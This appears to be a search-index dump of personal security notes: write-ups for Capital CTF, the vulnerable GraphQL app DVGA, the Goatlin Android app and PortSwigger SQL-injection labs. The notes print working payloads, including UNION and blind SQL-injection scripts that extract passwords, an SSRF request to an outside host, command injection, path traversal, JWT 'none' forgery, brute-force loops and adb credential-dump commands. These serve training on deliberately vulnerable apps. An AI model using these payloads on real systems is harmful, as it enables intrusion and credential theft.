Flag"},{"location":"ctfs/capital-ctf/#fourth-flag","text":"There's another port open. It is: 6379 . It's hosting redis, a database. Redis-cli is a command line program to communicate with it. Simply open a terminal, write redis-cli -h 127.0.0.1 and notice a database shell opens. Redis uses keyspaces to enumerate existing db's. That is, keyspace 0 means there is a db 0. To do that, write INFO keyspace . It will output the number of the database you need to select. Take into account this is only possible because there is no user authentication. The security misconfiguration happens because an attacker can interact with the server without authentication. Write SELECT 0 and enumerate all the keys with KEYS * . There's one called flag. Get it with GET flag . The flag is: flag{5eC_M1sc0nF1g} - Belongs to: Security Misconfiguration","title":"Fourth Flag"},{"location":"ctfs/capital-ctf/#fifth-flag","text":"If you provide a way to associate sentitive info with a profile, do not show that sensitive info in the API or frontend. Keep it in the backend. And if you do decide to show it, show only to the current user. Noticing the user's profile's returns card info, and that one user told he was giving away money, I concluded he had associated his card info. As such I did a GET to /api/profiles/TeamR$cket and there it was, his credit card info. I remembered the membership options and decided to test his card there. It worked a flag popped up. It is: flag{3xc3ss1v3_daTa_Xp0sur3} - Belongs to: Excessive Data Exposure","title":"Fifth Flag"},{"location":"ctfs/capital-ctf/#sixth-flag","text":"Most users re-use passwords and use passwords with personal information. In this case, the user Pikachu made a post with his favorite pokemons. Deductive reasoning led me to believe it could be one of his passwords. After placing the pokemon list on intruder and attempting each one to login, the last one let me in. The password is snorlax and the flag is: flag{br0k3n_uS3r_4uthEnt1cAt1oN} - Belongs to: Broken User Authentication Locking the account after 3-5 failed login attempts should fix this. You can't allow a user to bruteforce his way through your login system, as that will lead to a broken authentication system.","title":"Sixth Flag"},{"location":"ctfs/capital-ctf/#seventh-flag","text":"After logging on Pikachu, we can see there's a logging endpoint. We test it on the frontend and a message is displayed saying there is no logging or monitoring. We test it on the backend/API and we get a flag: flag{InsUfF1C3nT_L0gG1nG} - Belongs to: Insufficient Logging Lack of logging is problematic. You want to know who logged in and where, who takes action X or not. Logs are important to keep track of everything that happens in the application.","title":"Seventh Flag"},{"location":"ctfs/capital-ctf/#eighth-flag","text":"There's a post by Hodor which says there are administrative endpoints. We test it on the frontend with /admin/ and it is deprecated. We test it on the backend/API with /api/admin and we get a flag! flag{BFL4_I_aM_Th3_aDm1n_H3r3!} - Belongs to: Broken Function Level Authorization A normal user should not be allowed to access administrative endpoints, the backend code needs to make a check which looks at the user's roles and see's if it has the necessary ones to enter an admin endpoint: if(user.admin) { allow } else { do not }","title":"Eighth Flag"},{"location":"ctfs/capital-ctf/#ninth-flag","text":"Scrolling pages need to have a defined limit, a maximum number of articles, in this case, that it shows. Otherwise you can stress the database by asking too many, leading to a DoS. The limit parameter, in this case, we can change it to 200000 and we provoke rate-limiting issues and thus we get the flag: flag{L4cK_0f_R3s0urc3S_&_r4t3_L1m1t1ng} - Belongs to: Lack of Resources & Rate-Limiting","title":"Ninth Flag"},{"location":"ctfs/capital-ctf/#tenth-flag","text":"Developers often need to re-write parts of an API because they add new functionality to the frontend and need a way to communicate with the backend. Thus leading to a new directory, for example, v3 with the updated API. Forgetting to forbid access to the lower API versions could lead to security risks, as unpatched API is more prone to security issues and misconfigurations. Improser-Assets-Mangement, we can see the login endpoint has a v2. We attempt to use v1 and login. It works and the flag is there. It is: flag{Impr0peR_Ass3ts_ManAg3m3nt} - Belongs to: Improper Assets Mangement","title":"Tenth Flag"},{"location":"ctfs/dvga/dvga/","text":"DVGA It's a vulnerable graphql application mean't to train users in graphql hacking. Reconessaince Discovering graphql endpoint I started by using the application like a normal user, figuring out what it did but with BurpSuite open. After a few requests, I noticed it sent the information to an endpoint graphql . After sending a GET request, I noticed it expected a query parameter. This is it! GraphQL Type I used a fingerprinting tool which automatically does a number of things to detect that. It is graphw00f . After executing, it told me it was graphene. Googling I googled for graphene's characteristics and it had a lot of security misconfigurations by default. 1. Field Suggestions: Enabled by Default 2. Query Depth LImit: No Support 3. Query Cost Analysis: No Support 4. Introspection: Enabled by Default. This basically means: If we write a query with a field that doesn't exist but is keen to another one, it will suggest that. (That allows us to bruteforce the schema). In my opinion this falls into Security Misconfiguration of the TOP 10 API. There is no depth limit, which means we can make the query be as big as we want. In my opinion this falls into Lack of Resources and Rate-Limiting The server doesn't care about the cost the query has, that means it will execute it even if it will DoS the server. In my opinion, this falls into Lack of Resources and Rate-Limiting The server can \"look at itself\" and figure its schema via client request. In my opinion, this falls into - informative Instrospection fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}} Flags SQLi SQL Injection happens when user input is directly joined with an SQL statement without proper validation. One simply needs to ascertain the context in which injection occurs and validate the resulting SQL statement. In this case, the web application, with the below payload, returns errors from which we can deduce user input is directly inputted in the SQL statement. query={pastes(filter:\"1'\"){content}} SInce this is an error based SQLi we have output, and that means we can directly exfiltrate the information by constructing an appropriate query. Steal admin username: {pastes(filter:\"a'%20UNION%20SELECT%201%2c%202%2c%20password%2c%204%2c%205%2c%206%2c%207%2c%208%20FROM%20users%20+WHERE+username+=+'admin'+--\"){content}} This queries uses the UNION directive, which takes the results from two statements and places them on one virtual table. In this case, the first table, the one of the left, does not have an output, and the second query only has one. In order to find out which field is being reflected in the response, we can simply do SELECT 1, 2, 3, 4, 5, 6, 7, 8 and see which number is reflected, then we need only to replace, in the constructed statement, the number, for the field we want to SELECT. In this case, we care about the password field, so all we need to do is replace it with corresponding number. SSRF Server-Side Request Forgery - As the a name implies, a request is made server-side. In this case, it's not blind, as the html of the site requested is fully reflected onto the page. SSRF can be damaging. As it is server side, one can replace a simple http:// request, with, for example, file:// , then the server will interpret it as a directive to look into its own file system, and will then reflect the file you give it from there. {\"query\":\"mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!) {\\n importPaste(host: $host, port: $port, path: $path, scheme: $scheme) {\\n result\\n }\\n }\",\"variables\":{\"host\":\"eowhrtbaia65ev1.m.pipedream.net\",\"port\":443,\"path\":\"/\",\"scheme\":\"https\"}} Stored XSS & HTML Injection Stored XSS, or persistent XSS, means user input is reflected onto the html without proper validation and is stored in a databse, which means everytime you open the page, the payload will execute. Whether it be JS code or HTML code. {\"query\":\"mutation{createPaste(title:\\\"swag'<script>alert(1);</script>\\\",content:\\\"swag2'<script>alert(1);</script>\\\"){paste{title,content}}}\"} OS Command Injection OS Command Injection - This implies the direct use of input to the shell or simply a system function with input made by the user. That sink, or direct communcation with the shell, allows us to inject arbitrary commands on any host for as long as the host has those commands available. query={systemDebug(arg:+\";+sleep+10;\")} {\"query\":\"mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!) {\\n importPaste(host: $host, port: $port, path: $path, scheme: $scheme) {\\n result\\n }\\n }\",\"variables\":{\"host\":\"localhost\",\"port\":80,\"path\":\"/; uname -a;\",\"scheme\":\"http\"}} Discovering GraphQL - Discovering graphql is as simple as trying out a few of the common endpoints, as that is usually where it is installed. GET /graphql Resource Intensive Query Attack - {pastes(limit:100000){title,public,owner{paste{title,public,owner{paste{title,public,owner{paste{title,public}}}}}}}}} This happens because of circular logic. One object leads to another and that same object leads to the first one. This can be used to skip authorization checks or DoS. If we construct a query with the needed ammount of depth, we can DoS. If we use the circular logic to access like this: query={users(username:\"yourusername\"){posts(made_by:\"notyourusername\"){users{username}}} , we can bypass authorization checks. Batch Query Attack - mutation{login(username:\"admin\",password:\"admin\"){accessToken,refreshToken}second:login(username:+\"admin\",password:\"123456\"){accessToken,refreshToken}} or python CrackQL.py -t http://localhost:5013/graphql -q sample-queries/login.graphql -i sample-inputs/usernames_and_passwords.csv Batch queries - Means we can use a first query, then a second query, which means, multiple queries at the same time, can facilitate bruteforce. Aliases based Attack - Aliases are means to call the same object in two different ways so that they don't conflict. For example: { empireHero: hero(episode: EMPIRE) { name } jediHero: hero(episode: JEDI) { name } } WIth result: { \"data\": { \"empireHero\": { \"name\": \"Luke Skywalker\" }, \"jediHero\": { \"name\": \"R2-D2\" } } } query=query{q1:systemUpdate+q2:systemUpdate+q3:systemUpdate} Means we can create aliases for Objects and as such can do multiple queries of the same type at the same time, If enough queries are made, this can lead to DoS. GraphQL Query Deny List Bypass This can be done, if the check is done via operation name, by finding a way to rename the operation. Either via operation name or aliases, for example. This happens because the backend looks for a name which does not exist, as it was renamed by changing the operation name to an arbitrary value or creating an alias for that operation. { \"query\":\"{q1:systemHealth}\" } or { \"query\":\"query getPastes{systemHealth}\" } Arbitrary File Write & Path Traversal This happens because there is a sink in the source code which opens a file, allows traversal and then writes to it. In this case particularly, I can bet its the open function of Python with the w flag. It takes direct user input onto it and as such we can traverse and write arbitrarily mutation { uploadPaste(filename:\"../../../../../tmp/file.txt\", content:\"hi\"){ result } } GraphQL weak password protection Basically, there is no rate limit checking in place, and as such an attacker can send as many requests as he wants. This means he will be able to crack a password. Here is an example script: # Brute Force attack with a list of passwords: passwordlist = ['admin123', 'pass123', 'adminadmin', '123'] for password in passwordlist: resp = requests.post('http://host/graphql', json = { \"query\":\"query {\\n systemDiagnostics(username:\\\"admin\\\", password:\\\"{}\\\", cmd:\\\"ls\\\")\\n}\".format(password), \"variables\":None }) if not 'errors' in resp.text: print('Password is', password or you can use CrackQL: query{systemDiagnostics(username: \"admin\", password: {{password|str}}, cmd: \"sleep 10\") {}} Place this in a arbitrary named file with extension graphql: mypayload.graphql Pass it to CrackQL like: python CrackQL.py -t http://localhost:5013/graphql -q mypayload.graphql -i sample-inputs/passwords.csv``` GraphQL Interface There's an interface that allows to query GraphQL in a friendly way. Simply browse to http://localhost:5013/graphiql . If needed, set the graphiql:disabled cookie by switching disabled with enabled <=> graphiql:enabled JWT Token Forge This works because we can change the signing key to none and the server accepts that. Basically, the logic goes like this: We change the algorithm to none => send it to the server => recognizes that type => lets it pass without verifiying the signature because it accepts jwt's without one. To reproduce this, login as operator: {\"query\":\"mutation{login(username:\\\"operator\\\",password:\\\"password123\\\"){accessToken}}\"} Copy the accessToken (save it somewhere if you want). Go to token.dev Paste the token Change the algorithm to none Change user to admin Send a request like this but replace the token with yours (don't forget to include a . at the end of the token). {\"query\":\"{me(token:\\\"<your_token_here>\\\"){id,username,password}}\"} Send the request, notice you are admin and you have the password. Field Duplication Attack This happens because there's no restraint to how many fields can be inside a query. This can stress the server, leading to a DoS query { pastes { owner { pastes { ipAddr # 1 ipAddr # 2 ipAddr # 3 ipAddr # 4 ipAddr # 1000 } } }","title":"Dvga"},{"location":"ctfs/dvga/dvga/#dvga","text":"It's a vulnerable graphql application mean't to train users in graphql hacking.","title":"DVGA"},{"location":"ctfs/dvga/dvga/#reconessaince","text":"","title":"Reconessaince"},{"location":"ctfs/dvga/dvga/#discovering-graphql-endpoint","text":"I started by using the application like a normal user, figuring out what it did but with BurpSuite open. After a few requests, I noticed it sent the information to an endpoint graphql . After sending a GET request, I noticed it expected a query parameter. This is it!","title":"Discovering graphql endpoint"},{"location":"ctfs/dvga/dvga/#graphql-type","text":"I used a fingerprinting tool which automatically does a number of things to detect that. It is graphw00f . After executing, it told me it was graphene.","title":"GraphQL Type"},{"location":"ctfs/dvga/dvga/#googling","text":"I googled for graphene's characteristics and it had a lot of security misconfigurations by default. 1. Field Suggestions: Enabled by Default 2. Query Depth LImit: No Support 3. Query Cost Analysis: No Support 4. Introspection: Enabled by Default. This basically means: If we write a query with a field that doesn't exist but is keen to another one, it will suggest that. (That allows us to bruteforce the schema). In my opinion this falls into Security Misconfiguration of the TOP 10 API. There is no depth limit, which means we can make the query be as big as we want. In my opinion this falls into Lack of Resources and Rate-Limiting The server doesn't care about the cost the query has, that means it will execute it even if it will DoS the server. In my opinion, this falls into Lack of Resources and Rate-Limiting The server can \"look at itself\" and figure its schema via client request. In my opinion, this falls into - informative","title":"Googling"},{"location":"ctfs/dvga/dvga/#instrospection","text":"fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}","title":"Instrospection"},{"location":"ctfs/dvga/dvga/#flags","text":"SQLi SQL Injection happens when user input is directly joined with an SQL statement without proper validation. One simply needs to ascertain the context in which injection occurs and validate the resulting SQL statement. In this case, the web application, with the below payload, returns errors from which we can deduce user input is directly inputted in the SQL statement. query={pastes(filter:\"1'\"){content}} SInce this is an error based SQLi we have output, and that means we can directly exfiltrate the information by constructing an appropriate query. Steal admin username: {pastes(filter:\"a'%20UNION%20SELECT%201%2c%202%2c%20password%2c%204%2c%205%2c%206%2c%207%2c%208%20FROM%20users%20+WHERE+username+=+'admin'+--\"){content}} This queries uses the UNION directive, which takes the results from two statements and places them on one virtual table. In this case, the first table, the one of the left, does not have an output, and the second query only has one. In order to find out which field is being reflected in the response, we can simply do SELECT 1, 2, 3, 4, 5, 6, 7, 8 and see which number is reflected, then we need only to replace, in the constructed statement, the number, for the field we want to SELECT. In this case, we care about the password field, so all we need to do is replace it with corresponding number. SSRF Server-Side Request Forgery - As the a name implies, a request is made server-side. In this case, it's not blind, as the html of the site requested is fully reflected onto the page. SSRF can be damaging. As it is server side, one can replace a simple http:// request, with, for example, file:// , then the server will interpret it as a directive to look into its own file system, and will then reflect the file you give it from there. {\"query\":\"mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!) {\\n importPaste(host: $host, port: $port, path: $path, scheme: $scheme) {\\n result\\n }\\n }\",\"variables\":{\"host\":\"eowhrtbaia65ev1.m.pipedream.net\",\"port\":443,\"path\":\"/\",\"scheme\":\"https\"}} Stored XSS & HTML Injection Stored XSS, or persistent XSS, means user input is reflected onto the html without proper validation and is stored in a databse, which means everytime you open the page, the payload will execute. Whether it be JS code or HTML code. {\"query\":\"mutation{createPaste(title:\\\"swag'<script>alert(1);</script>\\\",content:\\\"swag2'<script>alert(1);</script>\\\"){paste{title,content}}}\"} OS Command Injection OS Command Injection - This implies the direct use of input to the shell or simply a system function with input made by the user. That sink, or direct communcation with the shell, allows us to inject arbitrary commands on any host for as long as the host has those commands available. query={systemDebug(arg:+\";+sleep+10;\")} {\"query\":\"mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!) {\\n importPaste(host: $host, port: $port, path: $path, scheme: $scheme) {\\n result\\n }\\n }\",\"variables\":{\"host\":\"localhost\",\"port\":80,\"path\":\"/; uname -a;\",\"scheme\":\"http\"}} Discovering GraphQL - Discovering graphql is as simple as trying out a few of the common endpoints, as that is usually where it is installed. GET /graphql Resource Intensive Query Attack - {pastes(limit:100000){title,public,owner{paste{title,public,owner{paste{title,public,owner{paste{title,public}}}}}}}}} This happens because of circular logic. One object leads to another and that same object leads to the first one. This can be used to skip authorization checks or DoS. If we construct a query with the needed ammount of depth, we can DoS. If we use the circular logic to access like this: query={users(username:\"yourusername\"){posts(made_by:\"notyourusername\"){users{username}}} , we can bypass authorization checks. Batch Query Attack - mutation{login(username:\"admin\",password:\"admin\"){accessToken,refreshToken}second:login(username:+\"admin\",password:\"123456\"){accessToken,refreshToken}} or python CrackQL.py -t http://localhost:5013/graphql -q sample-queries/login.graphql -i sample-inputs/usernames_and_passwords.csv Batch queries - Means we can use a first query, then a second query, which means, multiple queries at the same time, can facilitate bruteforce. Aliases based Attack - Aliases are means to call the same object in two different ways so that they don't conflict. For example: { empireHero: hero(episode: EMPIRE) { name } jediHero: hero(episode: JEDI) { name } } WIth result: { \"data\": { \"empireHero\": { \"name\": \"Luke Skywalker\" }, \"jediHero\": { \"name\": \"R2-D2\" } } } query=query{q1:systemUpdate+q2:systemUpdate+q3:systemUpdate} Means we can create aliases for Objects and as such can do multiple queries of the same type at the same time, If enough queries are made, this can lead to DoS. GraphQL Query Deny List Bypass This can be done, if the check is done via operation name, by finding a way to rename the operation. Either via operation name or aliases, for example. This happens because the backend looks for a name which does not exist, as it was renamed by changing the operation name to an arbitrary value or creating an alias for that operation. { \"query\":\"{q1:systemHealth}\" } or { \"query\":\"query getPastes{systemHealth}\" } Arbitrary File Write & Path Traversal This happens because there is a sink in the source code which opens a file, allows traversal and then writes to it. In this case particularly, I can bet its the open function of Python with the w flag. It takes direct user input onto it and as such we can traverse and write arbitrarily mutation { uploadPaste(filename:\"../../../../../tmp/file.txt\", content:\"hi\"){ result } } GraphQL weak password protection Basically, there is no rate limit checking in place, and as such an attacker can send as many requests as he wants. This means he will be able to crack a password. Here is an example script: # Brute Force attack with a list of passwords: passwordlist = ['admin123', 'pass123', 'adminadmin', '123'] for password in passwordlist: resp = requests.post('http://host/graphql', json = { \"query\":\"query {\\n systemDiagnostics(username:\\\"admin\\\", password:\\\"{}\\\", cmd:\\\"ls\\\")\\n}\".format(password), \"variables\":None }) if not 'errors' in resp.text: print('Password is', password or you can use CrackQL: query{systemDiagnostics(username: \"admin\", password: {{password|str}}, cmd: \"sleep 10\") {}} Place this in a arbitrary named file with extension graphql: mypayload.graphql Pass it to CrackQL like: python CrackQL.py -t http://localhost:5013/graphql -q mypayload.graphql -i sample-inputs/passwords.csv``` GraphQL Interface There's an interface that allows to query GraphQL in a friendly way. Simply browse to http://localhost:5013/graphiql . If needed, set the graphiql:disabled cookie by switching disabled with enabled <=> graphiql:enabled JWT Token Forge This works because we can change the signing key to none and the server accepts that. Basically, the logic goes like this: We change the algorithm to none => send it to the server => recognizes that type => lets it pass without verifiying the signature because it accepts jwt's without one. To reproduce this, login as operator: {\"query\":\"mutation{login(username:\\\"operator\\\",password:\\\"password123\\\"){accessToken}}\"} Copy the accessToken (save it somewhere if you want). Go to token.dev Paste the token Change the algorithm to none Change user to admin Send a request like this but replace the token with yours (don't forget to include a . at the end of the token). {\"query\":\"{me(token:\\\"<your_token_here>\\\"){id,username,password}}\"} Send the request, notice you are admin and you have the password. Field Duplication Attack This happens because there's no restraint to how many fields can be inside a query. This can stress the server, leading to a DoS query { pastes { owner { pastes { ipAddr # 1 ipAddr # 2 ipAddr # 3 ipAddr # 4 ipAddr # 1000 } } }","title":"Flags"},{"location":"dvwss/notes/","text":"","title":"Notes"},{"location":"goatlin/notes/","text":"Goatlin Notes M1 Content Provider A Content Provider provides data to android applications such as activities, services or receivers. Providers with weak permissions or exportable:true allows exfiltrating the data used by that content provider exportable:true implies all apps can query the content provider adb shell content commands adb shell content has three commands: insert, query, delete Usage Since exportable is true, we can simply query, insert or delete with adb: adb shell content query --uri content://com.cx.goatlin.accounts/Accounts ; adb shell content insert --uri content://com.cx.goatlin.accounts/Accounts --bind username:s:kotlin --bind password:s:goat M2 Data Data can be stored in an app with several ways depending on the kind of data stored, the usage of the data and if that data should be kept private or be shared. Data in Android can be stored in : App-specific storage : External or internal storage that stores files meant to be used by the app only Shared Storage : directories with files mean't to be shared by multiple apps KeyStore : stores cryptographic keys and other sensitive information. Data can be stored in the following formats: SQLite Databases the preferred way Shared Preferences : Stores key-pair values in a dedicated directory inside internal storage. It's very common to find api keys, passwords, PII information inside the shared preferences and databases. In goatlin, the user credentials after registration are stored in clear-text inside the database, and fetched with the same format after login: adb exec-out run-as com.cx.vulnerablekotlinapp cat /data/data/com.cx.vulnerablekotlinapp/databases/data > /tmp/kotlin-goat.sqlite M3 Mobile applications exchange data in a client-server fashion. Certificate Pinning Certificate pinning associates a certificate with a given host. It's how collections of valid certificates are bound to one host . If another certificate is not within that collection, it is refused . Lack of certificate pinning can lead to MiTM M4 Insecure Authentication is fairly common due to mobile devices input factor: 4-digit PINs examplify this. Important When authentication happens locally , it can be bypasses via jailbroken devices or through run time manipulation of the binary. In Goatlin, Insecure Authentication and Insecure data storage walk hand in hand: Example adb exec-out run-as com.cx.vulnerablekotlinapp cat /data/data/com.cx.vulnerablekotlinapp/databases/data > /tmp/kotlin-goat.sqlite M5 Important Whenever a bad actor returns your encrypted information to its original form , your cryptography was insufficient . M6 Authentication vs Authorization Authentication identifies something Authorization validates permissions of something M7 Goal The goal is to execute foreign code within the mobile code's address. Buffer Overflows and memory leaks should be top priorities. M8 What is Code tampering is directly modifying source-code by changing API's called, modify data and resources, manipulate memory content... Important Applications should be able to detect whether its own code was tampered with based on what it knows about it's own integrity. M9 What is Reverse Engineering is one of the first steps in a mobile application assessment because it allows to understand the application's internals: How's it working? What kind of communcations are established? Which libraries are used? Decompiling tools such as apktool and jadx are used for this. M10 Extraneous functionality are functions or secrets hidden inside the app, and they allow an attacker to perform unintended actions: Debug functions API KEYS Hidden backend endpoints","title":"Goatlin Notes"},{"location":"goatlin/notes/#goatlin-notes","text":"","title":"Goatlin Notes"},{"location":"goatlin/notes/#m1","text":"","title":"M1"},{"location":"goatlin/notes/#content-provider","text":"A Content Provider provides data to android applications such as activities, services or receivers. Providers with weak permissions or exportable:true allows exfiltrating the data used by that content provider exportable:true implies all apps can query the content provider","title":"Content Provider"},{"location":"goatlin/notes/#adb-shell-content-commands","text":"adb shell content has three commands: insert, query, delete","title":"adb shell content commands"},{"location":"goatlin/notes/#usage","text":"Since exportable is true, we can simply query, insert or delete with adb: adb shell content query --uri content://com.cx.goatlin.accounts/Accounts ; adb shell content insert --uri content://com.cx.goatlin.accounts/Accounts --bind username:s:kotlin --bind password:s:goat","title":"Usage"},{"location":"goatlin/notes/#m2","text":"","title":"M2"},{"location":"goatlin/notes/#data","text":"Data can be stored in an app with several ways depending on the kind of data stored, the usage of the data and if that data should be kept private or be shared. Data in Android can be stored in : App-specific storage : External or internal storage that stores files meant to be used by the app only Shared Storage : directories with files mean't to be shared by multiple apps KeyStore : stores cryptographic keys and other sensitive information. Data can be stored in the following formats: SQLite Databases the preferred way Shared Preferences : Stores key-pair values in a dedicated directory inside internal storage. It's very common to find api keys, passwords, PII information inside the shared preferences and databases. In goatlin, the user credentials after registration are stored in clear-text inside the database, and fetched with the same format after login: adb exec-out run-as com.cx.vulnerablekotlinapp cat /data/data/com.cx.vulnerablekotlinapp/databases/data > /tmp/kotlin-goat.sqlite","title":"Data"},{"location":"goatlin/notes/#m3","text":"Mobile applications exchange data in a client-server fashion.","title":"M3"},{"location":"goatlin/notes/#certificate-pinning","text":"Certificate pinning associates a certificate with a given host. It's how collections of valid certificates are bound to one host . If another certificate is not within that collection, it is refused . Lack of certificate pinning can lead to MiTM","title":"Certificate Pinning"},{"location":"goatlin/notes/#m4","text":"Insecure Authentication is fairly common due to mobile devices input factor: 4-digit PINs examplify this.","title":"M4"},{"location":"goatlin/notes/#important","text":"When authentication happens locally , it can be bypasses via jailbroken devices or through run time manipulation of the binary. In Goatlin, Insecure Authentication and Insecure data storage walk hand in hand:","title":"Important"},{"location":"goatlin/notes/#example","text":"adb exec-out run-as com.cx.vulnerablekotlinapp cat /data/data/com.cx.vulnerablekotlinapp/databases/data > /tmp/kotlin-goat.sqlite","title":"Example"},{"location":"goatlin/notes/#m5","text":"","title":"M5"},{"location":"goatlin/notes/#important_1","text":"Whenever a bad actor returns your encrypted information to its original form , your cryptography was insufficient .","title":"Important"},{"location":"goatlin/notes/#m6","text":"","title":"M6"},{"location":"goatlin/notes/#authentication-vs-authorization","text":"Authentication identifies something Authorization validates permissions of something","title":"Authentication vs Authorization"},{"location":"goatlin/notes/#m7","text":"","title":"M7"},{"location":"goatlin/notes/#goal","text":"The goal is to execute foreign code within the mobile code's address. Buffer Overflows and memory leaks should be top priorities.","title":"Goal"},{"location":"goatlin/notes/#m8","text":"","title":"M8"},{"location":"goatlin/notes/#what-is","text":"Code tampering is directly modifying source-code by changing API's called, modify data and resources, manipulate memory content...","title":"What is"},{"location":"goatlin/notes/#important_2","text":"Applications should be able to detect whether its own code was tampered with based on what it knows about it's own integrity.","title":"Important"},{"location":"goatlin/notes/#m9","text":"","title":"M9"},{"location":"goatlin/notes/#what-is_1","text":"Reverse Engineering is one of the first steps in a mobile application assessment because it allows to understand the application's internals: How's it working? What kind of communcations are established? Which libraries are used? Decompiling tools such as apktool and jadx are used for this.","title":"What is"},{"location":"goatlin/notes/#m10","text":"Extraneous functionality are functions or secrets hidden inside the app, and they allow an attacker to perform unintended actions: Debug functions API KEYS Hidden backend endpoints","title":"M10"},{"location":"portswigger/labs/","text":"PortSwigger labs SQL Injection It allows an attacker to interfere with database queries and retrieve information he should not be able to access. This can be done in various clauses, such as order by, where, having, like. It's important to visualize the current server-side query context by understanding the web app's functionality. Note: Filtering is usually done server side (WHERE clause) First LAB It's a web shop with various products and it can filter them by categories. The category value is directly inserted onto an SQL query in the WHERE clause. The objective is to see every product. This can be done with this simple payload: ' OR 1=1 -- Second LAB It's a web shop but I need to login as administrator. This can be done with a simple WHERE clause payload, as that's where the user input is inserted. The payload is: ' OR 1=1 -- If the result of the query is outputted in the response, then we can subvert that to retrieve other information from other tables with a UNION attack. It allows us to execute one or additional SELECT clauses and append the results to the original set. Example SELECT a, b FROM table1 UNION SELECT c, d FROM table2 BUT The individual queries must return the same number of columns. The data types in each column must be compatible between the individual queries. So, we need to figure out the number of columns in the original query to append a new query. This can be done with the order by keyword. We can order by the result-set column index., Example ' ORDER BY 1 ' ORDER BY 2 until we reach an error which says column with index 3 is out of range for the given table. We can also specify an arbitrary number of values in the new SELECT clause until we avoid the error. SELECT 1, 2, 3, 4... SELECT NULL, NULL, NULL, NULL.... Third LAB It's a web shop. We have another category parameter and we know its inserted in a where clause, the objective is to figure out the number of columns in the result set. As such, we do: ' ORDER BY 1 . No error. ' ORDER BY 2 . There's no error until 4, which means it has 3 columns. According to the lab description, we must use the NULL technique to solve. So we do: ' SELECT NULL,NULL,NULL Generally speaking, we need to know which columns are being reflected to see the resulting set of the UNION query. We can do that by using a unique character in each value of the SELECT clause and see where that is reflected. 'UNION SELECT 1,NULL,NULL ' UNION SELECT NULL,1,NULL Fourth LAB We need to combine the techniques portrayed earlier, so we insert in the category field: ' ORDER BY 2 -- . No error. Increasing one more gives us an error, so we have 2 columns in the result set. Next, we see which ones can reflect text. We insert: ' UNION SELECT 'hello', 'hello2' -- . We see both of the fields reflect text, so we can just: UNION SELECT username,password FROM users -- Fith LAB Sometimes only one column is reflected, so we must concatenating the strings in order to see the output. In this case, two are reflected but only one reflects text. First, we figure out which one with: UNION SELECT 'random_text', NULL -- and ' UNION SELECT NULL, 'random_text' -- . We see the second column accepts text, so we place our payload there: ' UNION SELE T NULL,username||'~'||password FROM users -- Note: String concatenation is different with each SQL version We can query the database version in different ways depending on what type is being served. Sixth LAB We use the techniques from before to figure out the columns in the result set and which one is being reflected. As such, the final payload is: ' UNION SELECT @@version, NULL -- - Note:All SQL versions in the cheatsheet accept -- - as a comment Blind SQL injection happens when there is no input reflected on the HTTP response. To test this, an attacker needs to be ware of the output of the application - does the content-length change with different boolean sql logic? That is, the app returns data depending on the query, just not the data you asked for in the query. Seventh LAB It's a blind SQLi, exploitable with the below script, because it looks for changes in the body, that take place if the query is true or not. 2:20 PM import requests import string def main(): password = \"\" for index in range(1, 21): for char in string.ascii_letters + string.digits: cookies = {\"TrackingId\":f\"pcLJqgVbBsfqEax3' AND (SELECT SUBSTRING(password, 1, {index}) FROM users WHERE username='administrator')='{password}{char}\", \"session\":\"LJy9oeGMExJomNP7psWb31UBvNi3Vt6Q\"} r = requests.get(\"https://0ada000e0444e88dc09a9948005700ad.web-security-academy.net/\", cookies=cookies) if \"welcome\" not in r.text.lower(): continue password += char print(password) index += 1 main() Eighth Lab To solve the lab, we need to display the database version string. We know we can use a UNION attack. First we need to see how many columns there are, we do that with an order by query: ' ORDER BY 1 -- - . When we get an error we know there are current column number - 1 columns. Then we need to see which columns displays strings. We do that with: ' UNION SELECT 'abc','def' -- - . The string reflected implies which column reflects. We know it's the first one, so we switch 'abc' for @@version and 'def' for NULL and the lab is solved. Ninth Lab First we need to find the name of the users table: ' UNION SELECT table_name, NULL FROM information_schema.tables -- - . After, we find the name of the columns in that table: ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=<found_table_name> Then we simply fetch username and password with our attained knowledge. ' UNION SELECT <found_username_column_name>, <found_password_column_name FROM <found_table_name> -- - We log in and the lab is solved. Tenth Lab We repeat the same 